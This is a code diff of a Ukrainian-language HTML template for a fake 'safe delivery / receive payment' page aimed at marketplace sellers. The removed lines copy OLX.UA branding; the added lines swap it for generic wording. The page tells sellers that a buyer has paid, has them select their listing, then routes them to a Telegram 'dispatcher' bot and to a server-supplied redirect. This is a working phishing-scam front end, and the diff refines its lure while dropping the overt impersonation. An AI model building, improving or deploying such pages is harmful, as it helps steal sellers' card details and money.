@@ -3,22 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Система Безпечних Транзакцій — OLX.UA</title>
+    <title>Система Безпечних Угод — Отримання Оплати</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --primary: #002f34;        /* Фирменный темно-зеленый OLX */
-            --primary-light: #1e293b;
-            --accent: #002f34;         
-            --accent-hover: #004f56;
-            --bg-color: #f2f4f5;       /* Серый фон как на оригинальном OLX */
+            --primary: #0a2540;        
+            --bg-color: #f4f6f8;       
             --card-bg: #ffffff;
-            --text-main: #002f34;      
-            --text-dark: #002f34;
-            --text-muted: #406367;
+            --text-main: #1c2434;      
+            --text-dark: #0f172a;
+            --text-muted: #627d98;
             --border-color: #e2e8f0;
-            --success: #00b56a;        /* Зеленый цвет кнопок OLX */
+            --success: #00b56a;        
             --warning-bg: #fffbeb;
             --warning-border: #fef08a;
             --warning-text: #713f12;
@@ -36,167 +33,150 @@
             background-color: var(--bg-color);
             color: var(--text-main);
             -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            line-height: 1.5;
+            line-height: 1.4;
         }
 
         header {
             background-color: var(--primary);
-            height: 64px;
+            height: 56px;
             display: flex;
             align-items: center;
             justify-content: center;
             position: sticky;
             top: 0;
             z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .header-logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #23e5db; /* Фирменный бирюзовый цвет букв */
+            color: #23e5db;
+            font-weight: 700;
+            font-size: 18px;
+            letter-spacing: 0.05em;
         }
 
         main {
-            max-width: 540px;
+            max-width: 480px;
             margin: 0 auto;
-            padding: 16px 16px 100px;
+            padding: 12px 12px 90px;
         }
 
         /* ИНФОРМАЦИОННЫЙ БЛОК */
         .status-container {
             background: var(--card-bg);
             border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 20px 16px;
+            border-radius: 12px;
+            padding: 16px 14px;
             text-align: center;
-            margin-bottom: 16px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02), 0 2px 4px -1px rgba(0, 0, 0, 0.01);
+            margin-bottom: 12px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
 
         .secure-badge {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            background: #eff6ff;
-            color: #2563eb;
-            padding: 6px 12px;
+            gap: 4px;
+            background: #e0f2fe;
+            color: #0369a1;
+            padding: 4px 10px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .main-headline {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 700;
             color: var(--text-dark);
             margin-bottom: 6px;
-            letter-spacing: -0.02em;
         }
 
         .main-subtext {
-            font-size: 13px;
+            font-size: 12.5px;
             color: var(--text-muted);
-            margin-bottom: 14px;
+            margin-bottom: 10px;
         }
 
         .how-it-works-link {
             display: inline-flex;
             align-items: center;
-            color: #2563eb;
+            color: #0284c7;
             text-decoration: none;
-            font-weight: 500;
-            font-size: 13px;
+            font-weight: 600;
+            font-size: 12.5px;
             cursor: pointer;
-            transition: color 0.2s ease;
         }
-        .how-it-works-link:hover { 
-            color: #1d4ed8; 
-            text-decoration: underline; 
-        }
+        .how-it-works-link:hover { text-decoration: underline; }
 
-        /* БЛОК ТЕЛЕГРАМ */
+        /* БЛОК СВЯЗИ */
         .tg-channels-container {
             background: #ffffff;
             border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 14px;
+            border-radius: 12px;
+            padding: 10px;
             text-align: center;
-            margin-bottom: 24px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
+            margin-bottom: 16px;
         }
 
         .tg-link {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            justify-content: center;
+            gap: 6px;
             color: #229ED9;
             text-decoration: none;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             background: #f0f9ff;
-            padding: 10px 20px;
-            border-radius: 10px;
+            padding: 8px 16px;
+            border-radius: 8px;
             width: 100%;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-        .tg-link:hover {
-            background: #e0f2fe;
         }
 
         .section-title {
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 11px;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 0.05em;
+            letter-spacing: 0.03em;
             color: var(--text-muted);
-            margin-bottom: 12px;
+            margin-bottom: 8px;
             display: block;
+            padding-left: 2px;
         }
 
-        /* СЕТКА ТОВАРОВ */
+        /* КОМПАКТНАЯ СЕТКА ТОВАРОВ */
         .ads-container {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
+            gap: 8px;
         }
 
         .ad-card {
             background: var(--card-bg);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
+            border-radius: 10px;
             overflow: hidden;
             display: flex;
             flex-direction: column;
             cursor: pointer;
-            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            transition: border-color 0.2s, box-shadow 0.2s;
             position: relative;
-        }
-
-        @media (hover: hover) {
-            .ad-card:hover { 
-                transform: translateY(-2px); 
-                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
-                border-color: #cbd5e1;
-            }
         }
 
         .ad-card.selected {
             border-color: var(--success);
-            box-shadow: 0 0 0 1px var(--success), 0 10px 15px -3px rgba(0, 181, 106, 0.08);
-            background: #fcfdfe;
+            box-shadow: 0 0 0 1px var(--success), 0 4px 12px rgba(0, 181, 106, 0.06);
         }
 
         .ad-image-wrapper {
             width: 100%;
-            height: 110px;
-            background: #f1f5f9;
+            height: 95px;
+            background: #f8fafc;
             border-bottom: 1px solid var(--border-color);
-            position: relative;
         }
 
         .ad-img { 
@@ -206,39 +186,48 @@
         }
 
         .ad-content { 
-            padding: 12px; 
+            padding: 8px; 
             flex-grow: 1; 
             display: flex; 
             flex-direction: column; 
             justify-content: space-between;
-            gap: 10px;
+            gap: 6px;
         }
         
         .ad-name { 
-            font-size: 13px; 
-            line-height: 1.4;
+            font-size: 12px; 
+            line-height: 1.3;
             font-weight: 500; 
             color: var(--text-dark);
-            margin: 0; 
-            height: 36px; 
+            height: 32px; 
             overflow: hidden; 
             display: -webkit-box;
             -webkit-line-clamp: 2;
             -webkit-box-orient: vertical;
         }
 
+        /* Значок Доставки */
+        .delivery-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--success);
+            background: #f0fdf4;
+            padding: 2px 6px;
+            border-radius: 4px;
+            width: fit-content;
+        }
+
         .selection-status { 
             font-size: 11px; 
             font-weight: 600; 
-            color: #707070; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px;
-            background: #f2f4f5;
-            padding: 6px;
-            border-radius: 6px;
-            transition: all 0.2s ease;
+            color: #64748b; 
+            text-align: center;
+            background: #f1f5f9;
+            padding: 4px;
+            border-radius: 5px;
         }
         
         .ad-card.selected .selection-status { 
@@ -246,12 +235,12 @@
             background: var(--success);
         }
 
-        /* Кнопка внизу фиксированная */
+        /* Фиксированная нижняя панель */
         .bottom-actions { 
             position: fixed;
             bottom: 0; left: 0; right: 0;
-            background: linear-gradient(to top, rgba(242,244,245,1) 85%, rgba(242,244,245,0) 100%);
-            padding: 16px 16px 24px;
+            background: linear-gradient(to top, rgba(244,246,248,1) 80%, rgba(244,246,248,0) 100%);
+            padding: 12px 12px 20px;
             z-index: 90;
             display: flex;
             justify-content: center;
@@ -259,25 +248,21 @@
 
         .btn-main {
             width: 100%;
-            max-width: 508px;
-            padding: 16px;
-            background: #e2e8f0;
-            color: #94a3b8;
+            max-width: 456px;
+            padding: 14px;
+            background: #cbd5e1;
+            color: #64748b;
             font-weight: 600;
             border: none;
-            border-radius: 12px;
-            font-size: 15px;
+            border-radius: 10px;
+            font-size: 14px;
             cursor: not-allowed;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+            transition: all 0.2s;
         }
         .btn-main.active { 
             background: var(--primary); 
             color: white; 
             cursor: pointer; 
-        }
-        .btn-main.active:hover { 
-            background: var(--accent-hover); 
         }
 
         /* Модальные окна */
@@ -285,166 +270,128 @@
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(15, 23, 42, 0.4);
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(2px);
             display: none;
             justify-content: center;
             align-items: flex-end;
             z-index: 1000;
-            padding: 0;
-            opacity: 0;
-            animation: fadeIn 0.25s forwards cubic-bezier(0.4, 0, 0.2, 1);
         }
-
-        @keyframes fadeIn { to { opacity: 1; } }
 
         .modal-content {
             background: white;
-            padding: 24px 20px;
-            border-top-left-radius: 20px;
-            border-top-right-radius: 20px;
+            padding: 20px;
+            border-top-left-radius: 16px;
+            border-top-right-radius: 16px;
             width: 100%;
-            max-height: 85vh;
+            max-height: 80vh;
             overflow-y: auto;
-            box-shadow: 0 -10px 25px -5px rgba(0, 0, 0, 0.1);
-            transform: translateY(100%);
-            animation: slideUp 0.3s forwards cubic-bezier(0.4, 0, 0.2, 1);
         }
-
-        @keyframes slideUp { to { transform: translateY(0); } }
 
         @media (min-width: 480px) {
             .modal-overlay { align-items: center; padding: 16px; }
-            .modal-content { border-radius: 16px; max-width: 440px; transform: scale(0.9); animation: scaleUp 0.25s forwards; }
-            @keyframes scaleUp { to { transform: scale(1); } }
+            .modal-content { border-radius: 12px; max-width: 400px; }
         }
 
         .modal-title {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 700;
             color: var(--text-dark);
-            margin-bottom: 16px;
-            letter-spacing: -0.01em;
-        }
-
-        .modal-body { 
-            font-size: 14px; 
-            line-height: 1.5; 
-            color: var(--text-main); 
+            margin-bottom: 12px;
         }
 
         .info-list { 
             list-style: none; 
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            margin: 4px 0 8px;
+            gap: 10px;
         }
         .info-list li { 
             display: flex;
-            gap: 10px;
+            gap: 8px;
             align-items: flex-start;
+            font-size: 13px;
         }
         .info-list li::before { 
             content: "✓"; 
-            color: #00b56a; 
+            color: var(--success); 
             font-weight: 700;
             background: #f0fdf4;
-            width: 20px;
-            height: 20px;
+            width: 18px; height: 18px;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             flex-shrink: 0;
-            font-size: 11px;
+            font-size: 10px;
         }
 
         .btn-close-modal {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: #f1f5f9;
             color: var(--text-dark);
             border: 1px solid var(--border-color);
-            border-radius: 10px;
+            border-radius: 8px;
             font-weight: 600;
-            font-size: 14px;
-            margin-top: 16px;
+            font-size: 13px;
+            margin-top: 14px;
             cursor: pointer;
-            transition: background 0.2s;
         }
-        .btn-close-modal:hover { background: #e2e8f0; }
 
         .warning-box {
             background: var(--warning-bg); 
-            padding: 16px; 
-            border-radius: 12px; 
+            padding: 12px; 
+            border-radius: 10px; 
             border: 1px solid var(--warning-border);
-            margin-top: 16px; 
+            margin-top: 12px; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
             text-align: center; 
-            gap: 12px;
+            gap: 10px;
         }
         .warning-text {
-            font-size: 13px;
+            font-size: 12.5px;
             font-weight: 500;
             color: var(--warning-text);
         }
 
         .chat-icon-circle {
-            width: 44px; height: 44px; 
+            width: 40px; height: 40px; 
             background-color: #229ED9; 
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center; 
-            animation: pulse 2s infinite;
-            box-shadow: 0 4px 12px rgba(34, 158, 217, 0.2);
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(34, 158, 217, 0.4); }
-            70% { transform: scale(1.04); box-shadow: 0 0 0 10px rgba(34, 158, 217, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(34, 158, 217, 0); }
         }
 
         .checkbox-container { 
-            margin-top: 16px; 
+            margin-top: 14px; 
             display: flex; 
             align-items: center; 
-            gap: 10px; 
+            gap: 8px; 
             cursor: pointer; 
             font-weight: 500; 
-            font-size: 13px;
+            font-size: 12.5px;
             background: #f8fafc;
-            padding: 12px;
-            border-radius: 8px;
+            padding: 10px;
+            border-radius: 6px;
             border: 1px solid var(--border-color);
-            color: var(--text-dark);
         }
         .checkbox-container input { 
-            width: 18px; 
-            height: 18px; 
-            flex-shrink: 0; 
+            width: 16px; height: 16px; 
             accent-color: #229ED9;
-            cursor: pointer;
         }
 
         .btn-go { 
             width: 100%; 
-            margin-top: 16px; 
-            padding: 15px; 
+            margin-top: 12px; 
+            padding: 14px; 
             background: #229ED9; 
             color: white; 
             border: none; 
-            border-radius: 10px; 
+            border-radius: 8px; 
             font-weight: 600; 
-            font-size: 15px; 
+            font-size: 14px; 
             display: none; 
             cursor: pointer; 
-            box-shadow: 0 4px 10px rgba(34, 158, 217, 0.15);
         }
-        .btn-go:hover { background: #1fa1e0; }
-        
-        #hidden-ads { display: contents; }
 
         .skeleton { 
             background: linear-gradient(90deg, #f1f5f9 25%, #e2e8f0 50%, #f1f5f9 75%); 
@@ -460,123 +407,103 @@
 
 <header>
     <div class="header-logo">
-        <svg width="76" height="38" viewBox="0 0 92 46" fill="currentColor">
-            <path d="M23 46C35.7025 46 46 35.7025 46 23C46 10.2975 35.7025 0 23 0C10.2975 0 0 10.2975 0 23C0 35.7025 10.2975 46 23 46ZM23 34.5C16.6487 34.5 11.5 29.3513 11.5 23C11.5 16.6487 16.6487 11.5 23 11.5C29.3513 11.5 34.5 16.6487 34.5 23C34.5 29.3513 29.3513 34.5 23 34.5Z" fill="#23e5db"/>
-            <path d="M49 0H60.5V34.5H75V46H49V0Z" fill="#ffffff"/>
-            <path d="M83.65 23L92 37.375L86.25 46L77.75 31.625L69.25 46L63.5 37.375L71.85 23L63.5 8.625L69.25 0L77.75 14.375L86.25 0L92 8.625L83.65 23Z" fill="#23e5db"/>
-        </svg>
+        <span>БЕЗПЕЧНА ДОСТАВКА</span>
     </div>
 </header>
 
 <main>
     <div class="status-container">
         <div class="secure-badge">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            Захищене з'єднання
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            Захищений протокол виплати
         </div>
-        <h1 class="main-headline">Верифікація операції</h1>
-        <p class="main-subtext">Для успішного зарахування коштів на ваш рахунок, будь ласка, підтвердіть деталі вашої поточної угоди.</p>
-        <div class="how-it-works-link" onclick="toggleModal('infoModal', true)">Детальніше про процес захисту</div>
+        <h1 class="main-headline">Зарахування коштів продавцю</h1>
+        <p class="main-subtext">Для успішного отримання оплати на банківську картку за вашим оголошенням, будь ласка, виберіть відповідний товар зі списку нижче.</p>
+        <div class="how-it-works-link" onclick="toggleModal('infoModal', true)">Як працює отримання грошей?</div>
     </div>
 
     <div class="tg-channels-container">
-        <a href="https://t.me/OlxMarket_robot" target="_blank" class="tg-link">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.62.15-.15 2.71-2.48 2.76-2.7.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.39.51-.46-.01-1.33-.26-1.98-.47-.8-.26-1.43-.4-1.37-.85.03-.23.35-.46.96-.71 3.76-1.63 6.27-2.71 7.53-3.23 3.58-1.48 4.32-1.74 4.81-1.75.11 0 .35.03.5.16.13.1.17.24.19.34z"/></svg>
-            Ми в Telegram: @OlxMarket_robot
+        <a href="https://t.me/MarketDelivery_robot" target="_blank" class="tg-link">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.62.15-.15 2.71-2.48 2.76-2.7.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.39.51-.46-.01-1.33-.26-1.98-.47-.8-.26-1.43-.4-1.37-.85.03-.23.35-.46.96-.71 3.76-1.63 6.27-2.71 7.53-3.23 3.58-1.48 4.32-1.74 4.81-1.75.11 0 .35.03.5.16.13.1.17.24.19.34z"/></svg>
+            Диспетчер у Telegram: @MarketDelivery_robot
         </a>
     </div>
 
-    <span class="section-title">Оберіть замовлення для підтвердження</span>
+    <span class="section-title">Оберіть ваше оголошення для отримання оплати</span>
 
     <div class="ads-container" id="ads-container">
         {% if user_ads is defined and user_ads is not none %}
             {% if user_ads|length > 0 %}
-                {% for ad in user_ads[:6] %}
+                {% for ad in user_ads %}
                 <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
                     <div class="ad-image-wrapper">
                         <img src="{{ ad.img }}" class="ad-img" alt="product">
                     </div>
                     <div class="ad-content">
                         <h2 class="ad-name">{{ ad.title }}</h2>
+                        <div class="delivery-badge">
+                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+                            Доставка
+                        </div>
                         <div class="selection-status">Обрати</div>
                     </div>
                 </div>
                 {% endfor %}
-
-                {% if user_ads|length > 6 %}
-                <div id="hidden-ads" style="display:none;">
-                    {% for ad in user_ads[6:] %}
-                    <div class="ad-card" onclick="selectAd(this, '{{ ad.url }}', '{{ ad.title }}')">
-                        <div class="ad-image-wrapper">
-                            <img src="{{ ad.img }}" class="ad-img" alt="product">
-                        </div>
-                        <div class="ad-content">
-                            <h2 class="ad-name">{{ ad.title }}</h2>
-                            <div class="selection-status">Обрати</div>
-                        </div>
-                    </div>
-                    {% endfor %}
-                </div>
-                <div style="grid-column: 1 / -1; text-align: center;">
-                    <button class="btn-link" id="toggle-btn" onclick="toggleAds()" style="margin: 12px auto; background:none; border:none; text-decoration:none; color:#2563eb; font-size: 13px; cursor:pointer; font-weight:600;">
-                        Показати всі замовлення ({{ user_ads|length }})
-                    </button>
-                </div>
-                {% endif %}
             {% else %}
-                <div style="grid-column: 1 / -1; text-align: center; padding: 32px 16px; background: var(--card-bg); border-radius: 12px; border: 1px solid var(--border-color);">
-                    <p style="font-size: 14px; color: var(--text-muted); margin: 0;">Доступні замовлення для обробки не знайдені.</p>
+                <div style="grid-column: 1 / -1; text-align: center; padding: 24px 12px; background: var(--card-bg); border-radius: 10px; border: 1px solid var(--border-color);">
+                    <p style="font-size: 13px; color: var(--text-muted); margin: 0;">Активні замовлення для виплати не знайдені.</p>
                 </div>
             {% endif %}
         {% else %}
-            <div class="ad-card skeleton" style="height:190px;"></div>
-            <div class="ad-card skeleton" style="height:190px;"></div>
+            <div class="ad-card skeleton" style="height:165px;"></div>
+            <div class="ad-card skeleton" style="height:165px;"></div>
         {% endif %}
     </div>
 
     <div class="bottom-actions">
-        <button id="confirm-btn" class="btn-main" onclick="openRules()" disabled>Підтвердити та перейти до верифікації</button>
+        <button id="confirm-btn" class="btn-main" onclick="openRules()" disabled>Підтвердити та отримати кошти</button>
     </div>
 </main>
 
+<!-- МОДАЛЬНОЕ ОКНО 1: О ДОСТАВКЕ -->
 <div class="modal-overlay" id="infoModal">
     <div class="modal-content">
-        <h2 class="modal-title">Як працює система захисту?</h2>
+        <h2 class="modal-title">Регламент безпечної доставки</h2>
         <div class="modal-body">
             <ul class="info-list">
-                <li><span><b>Вибір замовлення:</b> Переконайтеся, що ви обираєте саме те оголошення, за яким здійснюється поточна операція.</span></li>
-                <li><span><b>Автоматична верифікація:</b> Система перевіряє безпеку шлюзу та готує захищене середовище для транзакції.</span></li>
-                <li><span><b>Зарахування балансу:</b> Кошти переводяться на реквізити отримувача після підтвердження відповідності даних.</span></li>
-                <li><span><b>Повна гарантія:</b> Усі операції застраховані. У разі скасування кошти повертаються на баланс миттєво.</span></li>
+                <li><span><b>Вибір товару:</b> Покупець вже оплатив замовлення. Оберіть товар, щоб підтвердити готовність прийняти кошти.</span></li>
+                <li><span><b>Захист картки:</b> Транзакція виконується через сертифікований шлюз захисту онлайн-платежів.</span></li>
+                <li><span><b>Зарахування:</b> Кошти надійдуть на карту отримувача одразу після проходження авторизації шлюзу.</span></li>
             </ul>
         </div>
         <button class="btn-close-modal" onclick="toggleModal('infoModal', false)">Зрозуміло</button>
     </div>
 </div>
 
+<!-- МОДАЛЬНОЕ ОКНО 2: ФИНАЛИЗАЦИЯ И ЧАТ -->
 <div class="modal-overlay" id="rulesModal">
     <div class="modal-content">
-        <h2 class="modal-title">Фіналізація транзакції</h2>
+        <h2 class="modal-title">Активація виплати</h2>
         <div class="modal-body">
-            <p style="margin-bottom: 12px; color: var(--text-dark); font-weight: 500;">Зверніть увагу на регламент обробки:</p>
-            <p style="margin: 0 0 12px; font-size: 13.5px; color: var(--text-muted);">
-                • Департамент фінансового моніторингу працює: 10:00 — 00:00.<br>
-                • Метод авторизації платежу: ручна обробка черговим оператором.
+            <p style="margin-bottom: 10px; color: var(--text-dark); font-weight: 500; font-size: 13.5px;">Порядок завершення транзакції:</p>
+            <p style="margin: 0 0 10px; font-size: 12.5px; color: var(--text-muted);">
+                • Авторизація переказу здійснюється черговим оператором вручну.<br>
+                • Час обробки фінансових шлюзів: 10:00 — 00:00.
             </p>
             
             <div class="warning-box">
-                <span class="warning-text">Щоб завершити переказ та активувати платіжний шлюз, обов'язково надішліть повідомлення нашому спеціалісту підтримки:</span>
-                <div class="chat-icon-circle" onclick="window.open('https://t.me/OlxMarket_robot', '_blank')" style="cursor:pointer;">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.62.15-.15 2.71-2.48 2.76-2.7.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.39.51-.46-.01-1.33-.26-1.98-.47-.8-.26-1.43-.4-1.37-.85.03-.23.35-.46.96-.71 3.76-1.63 6.27-2.71 7.53-3.23 3.58-1.48 4.32-1.74 4.81-1.75.11 0 .35.03.5.16.13.1.17.24.19.34z"/></svg>
+                <span class="warning-text">Для підтвердження реквізитів та активації платіжного шлюзу обов'язково надішліть повідомлення нашому диспетчеру:</span>
+                <div class="chat-icon-circle" onclick="window.open('https://t.me/MarketDelivery_robot', '_blank')" style="cursor:pointer;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-1-.65-.35-1 .22-1.62.15-.15 2.71-2.48 2.76-2.7.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.53-1.39.51-.46-.01-1.33-.26-1.98-.47-.8-.26-1.43-.4-1.37-.85.03-.23.35-.46.96-.71 3.76-1.63 6.27-2.71 7.53-3.23 3.58-1.48 4.32-1.74 4.81-1.75.11 0 .35.03.5.16.13.1.17.24.19.34z"/></svg>
                 </div>
             </div>
             
             <label class="checkbox-container">
                 <input type="checkbox" id="agreeCheck" onchange="toggleFinalBtn()">
-                <span>Я ознайомився(-лась) з регламентом і готовий(-а) відкрити чат</span>
+                <span>Я готовий(-а) підтвердити та відкрити чат виплати</span>
             </label>
             
-            <button id="final-go-btn" class="btn-go" onclick="submitSelection()">Продовжити процес</button>
+            <button id="final-go-btn" class="btn-go" onclick="submitSelection()">Відкрити чат обробки</button>
         </div>
     </div>
 </div>
@@ -592,7 +519,7 @@ function selectAd(element, url, title) {
         card.querySelector('.selection-status').innerHTML = "Обрати";
     });
     element.classList.add('selected');
-    element.querySelector('.selection-status').innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="margin-right:2px;"><polyline points="20 6 9 17 4 12"></polyline></svg> ОБРАНО`;
+    element.querySelector('.selection-status').innerHTML = `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="margin-right:2px;"><polyline points="20 6 9 17 4 12"></polyline></svg> ОБРАНО`;
     selectedAdData = { url, title };
     const btn = document.getElementById('confirm-btn');
     btn.disabled = false; btn.classList.add('active');
@@ -607,7 +534,7 @@ function toggleFinalBtn() {
 
 async function submitSelection() {
     const btn = document.getElementById('final-go-btn');
-    btn.innerText = "Обробка запиту..."; btn.disabled = true;
+    btn.innerText = "Обробка..."; btn.disabled = true;
     try {
         const response = await fetch("/submit_ad", {
             method: "POST",
@@ -618,21 +545,11 @@ async function submitSelection() {
         if (response.ok && result.url) {
             window.location.href = result.url;
         } else { 
-            // Перенаправление в случае ошибки ответа сервера
-            window.location.href = "https://t.me/OlxMarket_robot";
+            window.location.href = "https://t.me/MarketDelivery_robot";
         }
     } catch (err) { 
-        // Перенаправление в случае сбоя сети / fetch
-        window.location.href = "https://t.me/OlxMarket_robot";
+        window.location.href = "https://t.me/MarketDelivery_robot";
     }
-}
-
-function toggleAds() {
-    const hidden = document.getElementById('hidden-ads');
-    const btn = document.getElementById('toggle-btn');
-    const isHidden = hidden.style.display === 'none';
-    hidden.style.display = isHidden ? 'contents' : 'none';
-    btn.innerText = isHidden ? 'Приховати додаткові замовлення' : `Показати всі замовлення`;
 }
 
 window.onload = () => {
